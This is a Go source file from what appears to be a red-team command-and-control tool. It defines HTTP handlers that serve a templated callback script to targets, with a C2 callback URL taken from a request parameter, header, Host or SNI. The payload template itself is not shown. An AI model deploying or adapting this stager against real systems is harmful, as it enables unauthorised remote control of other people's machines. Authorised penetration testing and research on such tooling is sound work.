package hsrv

/*
 * script.go
 * HTTP handlers
 * By J. Stuart McMurray
 * Created 20240324
 * Last Modified 20240731
 */

import (
	"bytes"
	_ "embed"
	"errors"
	"fmt"
	"math/rand"
	"net"
	"net/http"
	"os"
	"strconv"
	"text/template"

	"golang.org/x/net/idna"
)

// HTTPSPort is the default port for HTTPS and won't be added to URLs in
// generated scripts.
const HTTPSPort = "443"

// TemplateParams are combined with the callback template to generate the
// callback script.
type TemplateParams struct {
	PubkeyFP string
	URL      string
	ID       string
}

// C2Param is a URL parameter or header which may be set in requetss to /c to
// give the URL to which to call back.
const C2Param = "c2"

//go:embed script.tmpl
var DefaultTemplate string

// parseDefaultTemplate is the parsed form of DefaultTemplate.  We won't get
// very far if it doesn't parse.
var parsedDefaultTemplate = template.Must(
	template.New("").Parse(DefaultTemplate),
)

// scriptHandler serves up a script for calling us back.  Hope we like fork and
// exec...
func (s *Server) scriptHandler(w http.ResponseWriter, r *http.Request) {
	/* Work out the template to serve. */
	tmpl, err := s.readTemplate()
	if nil != err {
		s.RErrorLogf(r, "Error reading template: %s", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	/* Generate template parameters. */
	c2, err := s.c2URL(r)
	if nil != err {
		s.RErrorLogf(r, "Could not determine callback URL: %s", err)
		w.WriteHeader(http.StatusBadRequest)
		return
	}
	params := TemplateParams{
		PubkeyFP: s.l.Fingerprint,
		ID:       strconv.FormatUint(rand.Uint64(), 36),
		URL:      c2,
	}

	/* Execute the template and send it back. */
	b := new(bytes.Buffer)
	if err := tmpl.Execute(b, params); nil != err {
		s.RErrorLogf(r, "Failed to execute callback template: %s", err)
		w.WriteHeader(http.StatusInternalServerError)
		return
	}

	b.WriteTo(w)
	s.RLogf(
		ScriptColor,
		r,
		"Sent script: ID:%s URL:%s",
		params.ID,
		params.URL,
	)
}

// c2URL tries to get a C2 URL from r.  We try a query/form parameter, a
// c2: header, the Host: header, and the SNI, in that order.
func (s *Server) c2URL(r *http.Request) (string, error) {
	/* Parse the query and form and try to get it from there. */
	if err := r.ParseForm(); nil != err {
		return "", fmt.Errorf("parsing request: %w", err)
	}
	if p := r.Form.Get(C2Param); "" != p {
		return p, nil
	}

	/* If it's not there, try to get it as a header. */
	if p := r.Header.Get(C2Param); "" != p {
		return p, nil
	}

	/* Failing that, try the Host: header. */
	if p, err := idna.ToASCII(r.Host); nil != err {
		return "", fmt.Errorf("punycoding %s: %w", r.Host, err)
	} else if "" != p {
		return p, nil
	}

	/* No Host: header.  Probably HTTP/1.0.  Try the SNI. */
	if p := r.TLS.ServerName; "" != p {
		/* Make sure to add the port if it's not the default.  This
		should be infrequent enough we can do it every time.  Famous
		last words. */
		_, lp, err := net.SplitHostPort(s.l.Addr().String())
		if nil != err {
			return "", fmt.Errorf("getting listen port: %w", err)
		}
		if lp != HTTPSPort {
			p = net.JoinHostPort(p, lp)
		}
		return p, nil
	}

	/* Out of ideas at this point. */
	return "", errors.New("out of ideas")
}

// getTemplate tries to get a template from s.tmplf.  If s.tmplf is the empty
// string or s.tmplf doesn't exist, s.defTmpl is returned.
func (s *Server) readTemplate() (*template.Template, error) {
	/* If we don't have a file configured, life is easy. */
	if "" == s.tmplf {
		return s.defTmpl, nil
	}

	/* Read the template from the file. */
	b, err := os.ReadFile(s.tmplf)
	if nil != err {
		return nil, fmt.Errorf("reading %s: %w", s.tmplf, err)
	}

	/* Parse it. */
	tmpl, err := template.New("").Parse(string(b))
	if nil != err {
		return nil, fmt.Errorf("parsing %s: %w", s.tmplf, err)
	}

	return tmpl, nil
}
